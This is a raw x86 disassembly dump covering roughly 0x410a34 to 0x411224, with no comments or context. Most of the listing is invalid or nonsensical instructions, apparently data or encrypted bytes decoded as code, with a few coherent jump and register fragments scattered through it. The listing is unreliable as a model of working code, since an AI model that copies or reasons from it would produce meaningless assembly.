  410a34:	xchg   ebx,eax
  410a35:	mov    esp,edi
  410a37:	ret    0xee54
  410a3a:	pop    ss
  410a3b:	adc    eax,0x7fd153f9
  410a40:	jp     0x4109fe
  410a42:	xor    eax,0xddfd3f75
  410a47:	rcl    BYTE PTR [eax-0x7e],0x8
  410a4b:	mov    WORD PTR [ebx-0x1f],cs
  410a4e:	mov    dl,0x8a
  410a50:	out    0xc6,al
  410a52:	inc    edx
  410a53:	pop    ebx
  410a54:	cmc    
  410a55:	adc    dl,BYTE PTR [ebp+ebp*4+0x8]
  410a59:	in     eax,0xed
  410a5b:	aaa    
  410a5c:	stos   DWORD PTR es:[edi],eax
  410a5d:	add    ch,ah
  410a5f:	push   0xb73d2a95
  410a64:	add    eax,0xf6e0abc5
  410a69:	add    DWORD PTR [ebp-0x6a],0x42
  410a6d:	popa   
  410a6e:	xchg   edx,edx
  410a70:	and    eax,0x3be83f02
  410a75:	popa   
  410a76:	(bad)  
  410a77:	in     eax,dx
  410a78:	repz daa 
  410a7a:	inc    esp
  410a7b:	jge    0x410a22
  410a7d:	sub    ebp,DWORD PTR [edx-0x39]
  410a80:	fiadd  WORD PTR [eax]
  410a82:	aaa    
  410a83:	add    BYTE PTR [esi-0x3d236a81],al
  410a89:	push   esp
  410a8a:	not    DWORD PTR [edx-0x4ce42d7d]
  410a90:	adc    ebp,DWORD PTR [esi-0xe]
  410a93:	out    0x5b,eax
  410a95:	mov    edx,0xdfe1b3c2
  410a9a:	mov    bl,0x11
  410a9c:	cwde   
  410a9d:	push   edi
  410a9e:	adc    DWORD PTR [ebp-0x5a],0xffffff99
  410aa2:	shl    BYTE PTR [ecx-0x14],cl
  410aa5:	(bad)  
  410aa6:	mov    bl,0x94
  410aa8:	mov    esp,0xbc0f54c
  410aad:	push   edi
  410aae:	jle    0x410a9b
  410ab0:	std    
  410ab1:	add    dh,bl
  410ab3:	fcomp  QWORD PTR [ecx]
  410ab5:	xchg   ebx,eax
  410ab6:	sub    al,0xd8
  410ab8:	out    dx,al
  410ab9:	add    eax,0x81bf6fcd
  410abe:	push   cs
  410abf:	push   edi
  410ac0:	jae    0x410abc
  410ac2:	xchg   ebp,eax
  410ac3:	add    ch,BYTE PTR [edi-0x65]
  410ac6:	cmp    esi,DWORD PTR [ebx]
  410ac8:	test   al,0x79
  410aca:	pop    eax
  410acb:	cmp    eax,DWORD PTR [esi-0x57ceb477]
  410ad1:	mov    ebx,0x97926a8
  410ad6:	pop    ds
  410ad7:	int3   
  410ad8:	ret    
  410ad9:	icebp  
  410ada:	repnz imul eax,DWORD PTR ss:[edx-0x7e66d1c5],0xd184c6f2
  410ae6:	pop    ebp
  410ae7:	fwait
  410ae8:	mov    bl,0xd1
  410aea:	sub    al,0xab
  410aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aed:	fdiv   QWORD PTR [esi-0x4b]
  410af0:	aam    0x43
  410af2:	dec    esp
  410af3:	push   eax
  410af4:	cmp    eax,0x91316bc5
  410af9:	mov    eax,0x96c1dbe3
  410afe:	dec    edi
  410aff:	or     esp,edx
  410b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b02:	fsubr  QWORD PTR [ebp+0x3628c432]
  410b08:	mov    esi,0xc9fe151f
  410b0d:	jle    0x410abf
  410b0f:	mov    bh,0xa9
  410b11:	pop    ebx
  410b12:	xchg   edi,eax
  410b13:	xchg   ecx,eax
  410b14:	stos   DWORD PTR es:[edi],eax
  410b15:	xchg   ecx,eax
  410b16:	rcr    BYTE PTR [esi],cl
  410b18:	jae    0x410b58
  410b1a:	loop   0x410ab4
  410b1c:	mov    bl,bl
  410b1e:	fwait
  410b1f:	out    0xcd,eax
  410b21:	sub    DWORD PTR [edi],0x3b
  410b24:	dec    ebx
  410b25:	ins    DWORD PTR es:[edi],dx
  410b26:	pop    edx
  410b27:	mov    ss,ecx
  410b29:	daa    
  410b2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b2b:	lods   al,BYTE PTR ds:[esi]
  410b2c:	pop    ecx
  410b2d:	add    ebx,eax
  410b2f:	push   ss
  410b30:	mov    ds:0x4c2a6a04,eax
  410b35:	pop    esi
  410b36:	loope  0x410af3
  410b38:	sub    al,0xac
  410b3a:	ds jmp 0x410bbb
  410b3d:	test   al,0xfe
  410b3f:	sar    esp,1
  410b41:	mov    ds:0xbfa5921,al
  410b46:	fsubr  QWORD PTR [esi-0x77]
  410b49:	xor    al,0xec
  410b4b:	ins    BYTE PTR es:[edi],dx
  410b4c:	push   ebp
  410b4d:	add    dl,BYTE PTR [esi-0x19]
  410b50:	shl    DWORD PTR [edx-0x41a184f1],1
  410b56:	imul   esi,DWORD PTR [esi+0x7f],0x2d
  410b5a:	cwde   
  410b5b:	lahf   
  410b5c:	dec    esp
  410b5d:	aad    0xfa
  410b5f:	sbb    ecx,edi
  410b61:	retf   0x9f6c
  410b64:	mov    DWORD PTR [edi+0x7e32e0c0],edx
  410b6a:	call   0xe68a:0xcee4128b
  410b71:	shr    eax,1
  410b73:	pop    esi
  410b74:	mov    al,0x90
  410b76:	mov    DWORD PTR [eax-0x59],edi
  410b79:	cmp    eax,0x9da7baf0
  410b7e:	xor    ah,BYTE PTR [ecx+0x6d]
  410b81:	adc    ecx,esp
  410b83:	pop    esi
  410b84:	sbb    DWORD PTR [eax+0x5f15bc58],ebp
  410b8a:	je     0x410b26
  410b8c:	inc    ecx
  410b8d:	sbb    BYTE PTR [edx+0x39],ah
  410b90:	push   0xbdbd53
  410b95:	pop    ecx
  410b96:	cmc    
  410b97:	xchg   esi,eax
  410b98:	or     ch,BYTE PTR [edi-0x6ec98f7a]
  410b9e:	mov    ebx,0x864d1957
  410ba3:	stc    
  410ba4:	repnz sbb al,0xdb
  410ba7:	out    dx,al
  410ba8:	test   eax,0x612473ce
  410bad:	(bad)  
  410baf:	int3   
  410bb0:	jle    0x410bcb
  410bb2:	mov    al,ds:0x14dad263
  410bb7:	sub    bl,ah
  410bb9:	(bad)  
  410bba:	push   ds
  410bbb:	jmp    0x7610:0x9ca3c6f0
  410bc2:	xchg   BYTE PTR [edi],dh
  410bc4:	ss add bl,0xea
  410bc8:	addr16 sub al,0x63
  410bcb:	xor    bl,ah
  410bcd:	add    al,0xe2
  410bd0:	lahf   
  410bd1:	test   al,0x4
  410bd3:	sbb    edx,ebx
  410bd5:	daa    
  410bd6:	push   0xfffffffd
  410bd8:	mov    cl,0x3
  410bda:	test   DWORD PTR [edi+0x3a9cb87c],edx
  410be0:	fmul   DWORD PTR [ecx+0x52]
  410be3:	int    0x53
  410be5:	dec    edi
  410be6:	icebp  
  410be7:	mov    BYTE PTR [eax+0x7a2abf3c],dl
  410bed:	pop    ebx
  410bee:	push   ds
  410bef:	mov    dl,ch
  410bf1:	and    eax,0xc1cc665d
  410bf6:	mov    dl,0xe1
  410bf8:	and    DWORD PTR [edi+0x73],0xffffff9e
  410bfc:	mov    bl,0xc
  410bfe:	pushf  
  410bff:	frstor [ecx+ebx*2+0x26]
  410c03:	xchg   esp,eax
  410c04:	repnz and eax,0x72f9fa99
  410c0a:	mov    ch,0xd5
  410c0c:	out    0x4b,eax
  410c0e:	retf   
  410c0f:	adc    eax,DWORD PTR [ebp-0x6367ec85]
  410c15:	xchg   esp,eax
  410c16:	cmp    eax,0x1e557a9c
  410c1b:	xlat   BYTE PTR ds:[ebx]
  410c1c:	mov    eax,0x8e6605f
  410c21:	cmc    
  410c22:	test   DWORD PTR [eax+edi*4-0x298a7af8],ebx
  410c29:	mov    es,WORD PTR [edi-0x32df1c02]
  410c2f:	xchg   edx,eax
  410c30:	or     al,0x9f
  410c32:	jg     0x410c0f
  410c34:	and    dl,bl
  410c36:	jmp    0xcc2a810c
  410c3b:	in     eax,0x72
  410c3d:	sbb    BYTE PTR [esi+0x79],dl
  410c40:	jnp    0x410c42
  410c42:	jns    0x410c36
  410c44:	add    BYTE PTR [ecx],bh
  410c46:	pusha  
  410c47:	lock dec eax
  410c49:	int3   
  410c4a:	lock ins DWORD PTR es:[edi],dx
  410c4c:	lea    esi,[edx+0x3]
  410c4f:	pop    ebp
  410c50:	repz or ecx,DWORD PTR [ecx-0x30]
  410c54:	in     al,dx
  410c55:	xchg   ecx,eax
  410c56:	cld    
  410c57:	ret    
  410c58:	pushf  
  410c59:	rcl    DWORD PTR [ecx],1
  410c5b:	retf   
  410c5c:	mov    edx,0x876de95b
  410c61:	mov    ch,0x4f
  410c63:	outs   dx,DWORD PTR ds:[esi]
  410c64:	shr    DWORD PTR [esi+0x6e2dc42a],0xb7
  410c6b:	mov    ecx,0xfce8b9c4
  410c70:	cmp    BYTE PTR [esi+0x30],al
  410c73:	call   0x7ec0bf81
  410c78:	mov    dh,0x1
  410c7a:	and    cl,BYTE PTR [edi-0x22b78d8f]
  410c80:	xchg   edx,edx
  410c82:	jns    0x410c1c
  410c84:	or     edx,0x26
  410c87:	data16 in al,0x5f
  410c8a:	cld    
  410c8b:	popf   
  410c8c:	mov    esi,0x93b94d7a
  410c91:	retf   0x7fc2
  410c94:	(bad)  
  410c95:	test   BYTE PTR [ecx-0x2dd55a96],dl
  410c9b:	push   es
  410c9c:	pop    ss
  410c9d:	std    
  410c9e:	sub    eax,0x33efe688
  410ca3:	inc    esi
  410ca4:	(bad)  
  410ca5:	jle    0x410d0a
  410ca7:	repz jno 0x410d24
  410caa:	ss ret 
  410cac:	dec    esp
  410cad:	test   bh,ch
  410caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb0:	push   esi
  410cb1:	data16 lods al,BYTE PTR ds:[esi]
  410cb3:	inc    eax
  410cb4:	scas   eax,DWORD PTR es:[edi]
  410cb5:	fist   WORD PTR [esi+0x1]
  410cb8:	cmp    BYTE PTR [edi+0x65822470],bl
  410cbe:	or     al,0xf
  410cc0:	pop    ds
  410cc1:	sub    eax,0x802813e5
  410cc6:	ds dec edi
  410cc8:	ins    BYTE PTR es:[edi],dx
  410cc9:	pop    ecx
  410cca:	aad    0x57
  410ccc:	in     eax,dx
  410ccd:	cdq    
  410cce:	pop    es
  410ccf:	(bad)  
  410cd0:	lea    ecx,[edi-0xd]
  410cd3:	test   DWORD PTR [esi],edx
  410cd5:	jno    0x410c74
  410cd7:	jg     0x410d09
  410cd9:	push   ebp
  410cda:	lock mov ah,BYTE PTR [esi]
  410cdd:	add    bh,BYTE PTR [ecx+ecx*4]
  410ce0:	out    0x56,eax
  410ce2:	pop    ecx
  410ce3:	or     ch,BYTE PTR [esi+0x37]
  410ce6:	jmp    0xfe6826ce
  410ceb:	mov    edi,0x5e80e078
  410cf0:	fmul   QWORD PTR [ebx]
  410cf2:	xchg   esi,eax
  410cf3:	test   al,0x98
  410cf5:	add    al,0xc0
  410cf7:	push   0x8
  410cf9:	loopne 0x410ccb
  410cfb:	pop    edi
  410cfc:	(bad)  
  410cfd:	pop    ebx
  410cfe:	xor    dl,BYTE PTR [ebp+0x14b745f3]
  410d04:	inc    ebp
  410d05:	cwde   
  410d06:	call   0x3d97:0xc16481a1
  410d0d:	in     eax,dx
  410d0e:	xchg   ecx,eax
  410d0f:	(bad)  
  410d10:	push   esp
  410d11:	sub    ch,bh
  410d13:	add    BYTE PTR [ebx+0x65],ch
  410d16:	push   ebx
  410d17:	repz jne 0x410d7c
  410d1a:	mov    ebp,0x1d1373cc
  410d1f:	mov    ebp,0x11be0c7f
  410d24:	pop    esi
  410d25:	(bad)  
  410d26:	xchg   esp,eax
  410d27:	fcom   st(6)
  410d29:	inc    ebx
  410d2a:	shl    esi,cl
  410d2c:	not    BYTE PTR [ebx]
  410d2e:	xchg   DWORD PTR [ebx-0x24fff748],edx
  410d34:	(bad)  
  410d36:	mov    esp,0x6fa47d83
  410d3b:	(bad)  
  410d3c:	sahf   
  410d3d:	outs   dx,DWORD PTR ds:[esi]
  410d3e:	jge    0x410dba
  410d40:	rcr    BYTE PTR [edi+ebx*4],0x30
  410d44:	mov    ecx,0x97139033
  410d49:	gs and eax,0x1fdfacb6
  410d4f:	sub    edi,esp
  410d51:	adc    ecx,DWORD PTR [ecx+ebx*8+0x354284f6]
  410d58:	loop   0x410d0b
  410d5a:	loope  0x410db0
  410d5c:	leave  
  410d5d:	fiadd  DWORD PTR [esi+edx*1-0x4a]
  410d61:	loop   0x410db7
  410d63:	ja     0x410d64
  410d65:	push   0x3a
  410d67:	inc    eax
  410d68:	pop    edi
  410d69:	in     eax,dx
  410d6a:	push   esi
  410d6b:	lock or BYTE PTR [edx],dh
  410d6e:	adc    al,0x56
  410d70:	ret    0x483c
  410d73:	stc    
  410d74:	mov    al,ds:0xa5361a7
  410d79:	call   0xda38:0xc315e98e
  410d80:	fs stc 
  410d82:	or     DWORD PTR [edi-0x7],eax
  410d85:	mov    ebx,esi
  410d87:	mov    ebx,0xc6982898
  410d8c:	sbb    eax,0x511eaf02
  410d91:	mov    ds:0x87da35ff,al
  410d96:	ja     0x410d57
  410d98:	aas    
  410d99:	mov    ds:0xcba7bd7d,al
  410d9e:	mov    ds:0x1bc78098,eax
  410da3:	jae    0x410df2
  410da5:	mov    eax,ds:0x609b1b3b
  410daa:	lea    esi,[ebx+0x29a7f300]
  410db0:	in     eax,dx
  410db1:	lahf   
  410db2:	(bad)  
  410db3:	out    dx,al
  410db4:	sbb    dh,BYTE PTR [eax-0x6a00f242]
  410dba:	mov    eax,DWORD PTR [ebx]
  410dbc:	or     bl,dl
  410dbe:	xor    BYTE PTR [ecx+esi*2],ah
  410dc1:	xchg   edi,eax
  410dc2:	loope  0x410d8e
  410dc4:	adc    al,0x1
  410dc6:	push   ebx
  410dc7:	(bad)  
  410dc8:	xor    DWORD PTR [ecx],esi
  410dca:	into   
  410dcb:	hlt    
  410dcc:	push   edi
  410dcd:	mov    dh,BYTE PTR [esi+0x24]
  410dd0:	into   
  410dd1:	or     al,0x72
  410dd3:	fnstenv [eax-0x28926e8]
  410dd9:	jbe    0x410dec
  410ddb:	imul   edi,DWORD PTR [ecx-0x34],0xe366be6e
  410de2:	or     DWORD PTR [ebp+eax*4+0x41],esi
  410de6:	pop    eax
  410de7:	mov    edx,DWORD PTR [ebp+0x8]
  410dea:	jmp    0x4111de
  410def:	inc    edi
  410df0:	cli    
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0xd91a68b9
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410e79
  410e08:	pop    ebx
  410e09:	xchg   ebp,eax
  410e0a:	fidivr WORD PTR [ebx+0x5c]
  410e0d:	repnz rcl ecx,cl
  410e10:	and    ebp,ebx
  410e12:	test   dl,al
  410e14:	sub    BYTE PTR [edi+edx*8],ah
  410e17:	jg     0x410e8b
  410e19:	pop    ebx
  410e1a:	dec    esp
  410e1b:	aad    0x17
  410e1d:	and    al,0x30
  410e1f:	es dec ebx
  410e21:	push   0x3e
  410e23:	adc    DWORD PTR ss:0xd48cdfa2,esi
  410e2a:	pop    esi
  410e2b:	lock lods eax,DWORD PTR ds:[esi]
  410e2d:	pop    esi
  410e2e:	jle    0x410e66
  410e30:	inc    edx
  410e31:	push   ss
  410e32:	out    0xcc,eax
  410e34:	cmp    edi,DWORD PTR [edi+eiz*2+0x20cd24f4]
  410e3b:	jns    0x410e2c
  410e3d:	int3   
  410e3e:	rep outs dx,BYTE PTR ds:[esi]
  410e40:	das    
  410e41:	pop    es
  410e42:	push   es
  410e43:	popf   
  410e44:	lods   al,BYTE PTR ds:[esi]
  410e45:	xor    al,0x8c
  410e47:	scas   eax,DWORD PTR es:[edi]
  410e48:	pusha  
  410e49:	outs   dx,DWORD PTR ds:[esi]
  410e4a:	sbb    ecx,DWORD PTR ds:0xbc034857
  410e50:	fcom   st(5)
  410e52:	fld    QWORD PTR [eax+0x675ffefe]
  410e58:	mov    ch,0x52
  410e5a:	jmp    0xd8e2e001
  410e5f:	call   0x1053edf5
  410e64:	jb     0x410eb0
  410e66:	xchg   esp,eax
  410e67:	mov    BYTE PTR [esi+edx*8+0x51],al
  410e6b:	add    eax,0x77fb7645
  410e70:	sbb    DWORD PTR [esi-0x10],ecx
  410e73:	mov    eax,0xb13c12b9
  410e78:	test   eax,esi
  410e7a:	out    dx,al
  410e7b:	fwait
  410e7c:	jge    0x410e7a
  410e7e:	cmc    
  410e7f:	test   ch,al
  410e81:	scas   al,BYTE PTR es:[edi]
  410e82:	xlat   BYTE PTR ds:[ebx]
  410e83:	inc    BYTE PTR [ecx+0x1133c9ac]
  410e89:	sahf   
  410e8a:	ret    
  410e8b:	jne    0x410e7c
  410e8d:	mov    bh,0x33
  410e8f:	inc    ebx
  410e90:	js     0x410f00
  410e92:	mov    BYTE PTR [esp+ecx*4+0x69afa868],dh
  410e99:	cwde   
  410e9a:	xor    eax,0x6f7139ae
  410e9f:	lods   eax,DWORD PTR ds:[esi]
  410ea0:	fucomip st,st(4)
  410ea2:	or     al,0x7c
  410ea4:	mov    esi,0xe62b0506
  410ea9:	add    BYTE PTR [ebx+0x42c125ff],dh
  410eaf:	mov    dh,0x8e
  410eb1:	adc    eax,0x6136fb72
  410eb6:	out    0x4c,al
  410eb8:	jecxz  0x410ef1
  410eba:	add    eax,0x81535b3d
  410ebf:	or     al,0x6a
  410ec1:	mov    DWORD PTR [edx-0x5b7d7600],0xb29369e2
  410ecb:	aaa    
  410ecc:	mov    dl,0x9b
  410ece:	out    0xd9,eax
  410ed0:	add    dl,bh
  410ed2:	stos   BYTE PTR es:[edi],al
  410ed3:	pop    ebx
  410ed4:	jo     0x410ea4
  410ed6:	or     eax,0xa8412f3
  410edb:	lock aaa 
  410edd:	jmp    0x172f8514
  410ee2:	bound  esi,QWORD PTR [ebx]
  410ee4:	xor    eax,0xa6b50753
  410ee9:	mov    ebx,0xb3236498
  410eee:	in     eax,0xd7
  410ef0:	add    al,0xb5
  410ef2:	(bad)  
  410ef4:	not    BYTE PTR [ecx+0x6b]
  410ef7:	dec    edx
  410ef8:	daa    
  410ef9:	jl     0x410ed3
  410efb:	jnp    0x410f64
  410efd:	aad    0x95
  410eff:	sbb    DWORD PTR [eax],esi
  410f01:	push   esp
  410f02:	mov    DWORD PTR [eax+esi*1+0x4b],0x340f7ee
  410f0a:	and    al,0xe
  410f0c:	push   esp
  410f0d:	and    eax,0x63d25a77
  410f12:	sub    DWORD PTR ds:0x6e3dbec3,0x35f42354
  410f1c:	sbb    DWORD PTR [edi],esi
  410f1e:	out    0xc2,eax
  410f20:	test   al,0x83
  410f22:	adc    al,0x68
  410f25:	lods   al,BYTE PTR ds:[esi]
  410f26:	pop    DWORD PTR [ebp+0x53]
  410f29:	push   ebp
  410f2a:	in     eax,dx
  410f2b:	in     eax,0x3c
  410f2d:	push   edx
  410f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f2f:	retf   
  410f30:	call   0x8d561f4d
  410f35:	arpl   WORD PTR [edx],dx
  410f37:	out    0x6c,al
  410f39:	jmp    0x410f6b
  410f3b:	xor    BYTE PTR [eax+ebp*2+0x1769ec4c],0xe3
  410f43:	cmc    
  410f44:	mov    al,ds:0x840687d
  410f49:	mov    dh,0x17
  410f4b:	mov    al,0xe9
  410f4d:	pop    esi
  410f4e:	xchg   ecx,eax
  410f4f:	mov    cl,0x3b
  410f51:	es dec ecx
  410f53:	cmp    BYTE PTR [esi+0x2bf793ce],0x5f
  410f5a:	lds    ecx,FWORD PTR [edi+0x48d0a251]
  410f60:	or     edi,ebx
  410f62:	adc    BYTE PTR [ebp-0x52a9163c],cl
  410f68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f69:	pop    es
  410f6a:	out    dx,eax
  410f6b:	imul   ebp,DWORD PTR [ebx-0x29],0x57325faa
  410f72:	aam    0x1b
  410f74:	icebp  
  410f75:	mov    DWORD PTR [edx-0x4b],edx
  410f78:	and    ebx,eax
  410f7a:	aas    
  410f7b:	mov    al,0xbd
  410f7d:	push   cs
  410f7e:	inc    esi
  410f7f:	mov    WORD PTR [ecx+ebp*1],fs
  410f82:	iret   
  410f83:	mov    dl,0x3d
  410f85:	pop    ecx
  410f86:	(bad)  [ebx+0x3]
  410f89:	retf   
  410f8a:	(bad)  
  410f8b:	lea    ebx,ds:0x260be329
  410f91:	mov    bl,bl
  410f93:	pop    eax
  410f94:	mov    edi,0x13c62eab
  410f99:	loop   0x410f51
  410f9b:	jle    0x410f3e
  410f9d:	call   0x109712aa
  410fa2:	inc    eax
  410fa3:	dec    ebp
  410fa4:	retf   
  410fa5:	sub    DWORD PTR [ebx+0x27bd9441],ecx
  410fab:	ret    
  410fac:	out    0x43,eax
  410fae:	aaa    
  410faf:	mov    bh,0x50
  410fb1:	pushf  
  410fb2:	cmp    BYTE PTR [esi],0xb9
  410fb5:	or     DWORD PTR [esp+ebx*4],esp
  410fb8:	mov    WORD PTR [edx-0x6d581136],?
  410fbe:	push   ecx
  410fbf:	pop    edx
  410fc0:	das    
  410fc1:	cs ds sub al,0x43
  410fc5:	shl    BYTE PTR ds:0x55153c91,0xa8
  410fcc:	and    cl,ah
  410fce:	data16 aaa 
  410fd0:	adc    al,0xf0
  410fd2:	cld    
  410fd3:	aaa    
  410fd4:	jl     0x410fcc
  410fd6:	mov    eax,0xa56b939f
  410fdb:	js     0x411043
  410fdd:	xor    BYTE PTR [edi-0x15],bh
  410fe0:	sub    eax,0xc8464279
  410fe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fe6:	jg     0x410f6f
  410fe8:	push   cs
  410fe9:	test   al,0xa3
  410feb:	sbb    edi,ecx
  410fed:	loopne 0x410fe8
  410fef:	adc    ah,BYTE PTR [edx-0x1abb9dfd]
  410ff5:	scas   eax,DWORD PTR es:[edi]
  410ff6:	shr    BYTE PTR [edx-0x278e82e0],cl
  410ffc:	cld    
  410ffd:	push   eax
  410ffe:	and    DWORD PTR [ebx],0x75669cf9
  411004:	jp     0x410f8d
  411006:	rcl    dl,1
  411008:	lds    esi,FWORD PTR [ebx+ebx*2+0x1a]
  41100c:	or     dl,BYTE PTR [ecx]
  41100e:	jmp    0x25c7:0x61a07919
  411015:	outs   dx,DWORD PTR ds:[esi]
  411016:	mov    ebx,0xac2ff1fc
  41101b:	jg     0x411021
  41101d:	cmp    al,0x18
  41101f:	test   eax,0x93514b3
  411024:	sbb    BYTE PTR [eax+ebp*8+0x5b1685d6],ah
  41102b:	sbb    BYTE PTR gs:[esi-0x1d1ead14],ah
  411032:	ja     0x410fce
  411034:	add    eax,0xc9b993c2
  411039:	mov    ecx,ds
  41103b:	hlt    
  41103c:	jns    0x411016
  41103e:	jnp    0x41100d
  411040:	lahf   
  411041:	pop    ss
  411042:	mov    dh,0xc0
  411044:	js     0x41108a
  411046:	pop    edx
  411047:	mov    ah,0x35
  411049:	enter  0x812,0x6c
  41104d:	sub    bl,dl
  41104f:	cs push eax
  411051:	sub    BYTE PTR [edi+0x4c6a88cf],bl
  411057:	pusha  
  411058:	std    
  411059:	dec    ebp
  41105a:	inc    ecx
  41105b:	mov    esp,0x96f3aa6e
  411060:	pop    esp
  411061:	stos   BYTE PTR es:[edi],al
  411062:	adc    bl,BYTE PTR [eax]
  411064:	add    DWORD PTR [edi+0x54],edx
  411067:	in     al,0x3c
  411069:	and    BYTE PTR [edx],al
  41106b:	and    dh,BYTE PTR [edx+0x2dc89069]
  411071:	in     eax,0xfb
  411073:	neg    BYTE PTR [edx]
  411075:	jo     0x411050
  411077:	popf   
  411078:	shl    DWORD PTR [eax],0xc2
  41107b:	retf   0x5b26
  41107e:	sub    al,0x6a
  411080:	shl    al,cl
  411082:	sbb    ch,BYTE PTR [esi-0x366507fe]
  411088:	nop
  411089:	std    
  41108a:	pop    ds
  41108b:	pop    esp
  41108c:	fiadd  DWORD PTR [ecx-0x1030ddb5]
  411092:	pop    ss
  411093:	fbstp  TBYTE PTR [esi+ebx*2]
  411096:	cld    
  411097:	xor    DWORD PTR [ecx+0x65322c40],0x98ba0f7d
  4110a1:	pop    edx
  4110a2:	in     al,dx
  4110a3:	adc    ebp,DWORD PTR [ebx]
  4110a5:	xor    BYTE PTR [ebx-0xdd12134],dl
  4110ab:	aaa    
  4110ac:	loopne 0x411045
  4110ae:	mov    dh,0xb8
  4110b0:	push   ds
  4110b1:	lods   al,BYTE PTR gs:[esi]
  4110b3:	adc    BYTE PTR [ecx+0x424686b8],dh
  4110b9:	cs push ds
  4110bb:	push   es
  4110bc:	repnz in al,0x74
  4110bf:	pusha  
  4110c0:	sub    BYTE PTR [edi],al
  4110c2:	inc    esp
  4110c3:	shl    DWORD PTR [eax+0x7],0x3f
  4110c7:	mov    ah,0x98
  4110c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ca:	(bad)  [ecx+0x40]
  4110cd:	lods   eax,DWORD PTR fs:[esi]
  4110cf:	xchg   ebx,eax
  4110d0:	push   ecx
  4110d1:	es cmp al,cl
  4110d4:	mov    al,0x23
  4110d6:	or     DWORD PTR [ebx-0x5bdafb8a],esi
  4110dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110dd:	cmp    eax,0xdda16e46
  4110e2:	sub    bh,BYTE PTR [ecx+0x3d]
  4110e5:	push   ebx
  4110e6:	mov    esp,0xe90e6d8
  4110eb:	adc    dl,BYTE PTR [eax]
  4110ed:	loopne 0x4110d8
  4110ef:	inc    ebp
  4110f0:	fcmovnb st,st(3)
  4110f2:	pop    edx
  4110f3:	out    dx,al
  4110f4:	jp     0x411117
  4110f6:	sti    
  4110f7:	pop    ebp
  4110f8:	pop    ecx
  4110f9:	sbb    DWORD PTR [edx+edx*8+0x3f],0x3cbbcf34
  411101:	packssdw mm3,QWORD PTR [ecx+0x6d81022b]
  411108:	dec    esp
  411109:	cmp    DWORD PTR [eax-0x62c20b0c],ebp
  41110f:	ins    BYTE PTR es:[edi],dx
  411110:	inc    ecx
  411111:	sahf   
  411112:	call   0x62596846
  411117:	ds push cs
  411119:	imul   esi,ebp,0x6a361263
  41111f:	mov    gs,WORD PTR [ebp+0x5f]
  411122:	xor    dl,BYTE PTR [ebx-0x77d90478]
  411128:	jbe    0x411154
  41112a:	jmp    0x7527:0x808e47f1
  411131:	frstor [edx+0x183a7150]
  411137:	push   ds
  411138:	test   DWORD PTR [ecx+0x3d],ecx
  41113b:	cld    
  41113c:	mov    ah,0x63
  41113e:	pop    edx
  41113f:	in     al,dx
  411140:	aas    
  411141:	add    eax,0x907bdc3e
  411146:	jae    0x4110f3
  411148:	mov    ds:0xf86676fc,al
  41114d:	cmp    al,0x9
  41114f:	inc    ebx
  411150:	pop    ds
  411151:	pop    esi
  411152:	call   0x7404:0x1080e2c6
  411159:	popf   
  41115a:	test   al,0x6d
  41115c:	jb     0x411197
  41115e:	mov    dh,BYTE PTR ds:0xd4ebe21c
  411164:	jl     0x41115a
  411166:	fwait
  411167:	ins    DWORD PTR es:[edi],dx
  411168:	mov    edi,0x25611b22
  41116d:	pop    es
  41116e:	paddb  mm6,mm4
  411171:	(bad)  
  411172:	xor    edi,ebp
  411174:	inc    esp
  411175:	jmp    FWORD PTR [edx+0x5c]
  411178:	test   al,0xf5
  41117a:	(bad)  
  41117b:	(bad)  
  41117c:	out    0x22,al
  41117e:	push   cs
  41117f:	add    esi,ecx
  411181:	xchg   ebx,eax
  411182:	cmp    al,BYTE PTR [ebp-0x2cd74442]
  411188:	dec    eax
  411189:	mul    DWORD PTR [ecx-0x3f]
  41118c:	adc    edi,DWORD PTR [ecx+0x5d]
  41118f:	leave  
  411190:	push   edi
  411191:	mov    al,0xb9
  411193:	loop   0x4111c7
  411195:	mov    ds:0xc473abc7,al
  41119a:	pop    eax
  41119b:	lods   eax,DWORD PTR ds:[esi]
  41119c:	(bad)  
  41119d:	out    dx,al
  41119e:	pcmpeqd mm3,QWORD PTR [ebp+esi*4-0x34]
  4111a3:	jo     0x4111ef
  4111a5:	mov    esp,DWORD PTR [ebp-0x35]
  4111a8:	push   ebp
  4111a9:	jmp    0xf348:0x2a4e01fe
  4111b0:	push   esi
  4111b1:	add    al,0x7e
  4111b3:	mov    ds:0xe47034ae,eax
  4111b8:	jg     0x4111fc
  4111ba:	push   esi
  4111bb:	dec    ecx
  4111bc:	sbb    BYTE PTR [ebp-0x1c1a88b2],ah
  4111c2:	in     al,0xa7
  4111c4:	xor    ebp,esp
  4111c6:	adc    al,BYTE PTR [edi-0xd14c67e]
  4111cc:	inc    ebp
  4111cd:	xchg   edx,eax
  4111ce:	sub    ecx,DWORD PTR fs:[eax-0x4c02dd1d]
  4111d5:	jo     0x41124f
  4111d7:	or     ah,BYTE PTR [ebx+0x3c2348ae]
  4111dd:	pop    ebx
  4111de:	xor    eax,ecx
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp+0x10435cff],cl
  4111ff:	data16 lahf 
  411201:	lock xchg ebp,eax
  411203:	inc    esp
  411204:	jo     0x411276
  411206:	dec    ecx
  411207:	jge    0x411279
  411209:	jo     0x4111b7
  41120b:	sbb    bh,BYTE PTR ds:0x87dd4f0
  411211:	(bad)  [eax-0x2b]
  411214:	cmp    BYTE PTR [ecx+0x3a9b1657],dh
  41121a:	ret    
  41121b:	aas    
  41121c:	daa    
  41121d:	xor    BYTE PTR [ebx-0x5184f40],0xb5
  411224:	cli    
